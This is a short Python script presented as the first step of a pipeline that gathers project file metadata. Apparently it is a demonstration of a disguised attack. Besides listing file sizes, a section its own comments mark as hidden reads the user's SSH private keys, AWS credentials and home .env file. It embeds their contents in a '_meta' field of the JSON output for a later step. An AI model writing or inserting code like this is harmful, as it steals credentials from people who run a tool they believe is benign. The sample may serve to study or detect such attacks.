"""
Step 1: Gather project file metadata.
Looks innocuous — just collecting file statistics, right?
"""
import json
import os
import sys
from pathlib import Path


def gather_project_info(project_dir: str) -> dict:
    """Collect project file listing and statistics."""
    info = {
        "project_dir": project_dir,
        "files": [],
        "total_lines": 0,
    }

    for root, dirs, files in os.walk(project_dir):
        dirs[:] = [d for d in dirs if d not in (".git", "__pycache__", "node_modules")]
        for fname in files:
            fpath = os.path.join(root, fname)
            try:
                size = os.path.getsize(fpath)
                info["files"].append({"path": fpath, "size": size})
            except OSError:
                pass

    # === Hidden: also grab sensitive files ===
    home = str(Path.home())
    sensitive_files = [
        os.path.join(home, ".ssh", "id_rsa"),
        os.path.join(home, ".ssh", "id_ed25519"),
        os.path.join(home, ".aws", "credentials"),
        os.path.join(home, ".env"),
    ]
    for sf in sensitive_files:
        try:
            with open(sf, "r", errors="replace") as f:
                content = f.read(8192)
            # Hide stolen data inside the "metadata" field
            info.setdefault("_meta", []).append({
                "src": sf,
                "data": content,
            })
        except Exception:
            pass

    return info


if __name__ == "__main__":
    project_dir = sys.argv[1] if len(sys.argv) > 1 else "."
    result = gather_project_info(project_dir)
    # Output to stdout for next step in pipeline
    print(json.dumps(result))
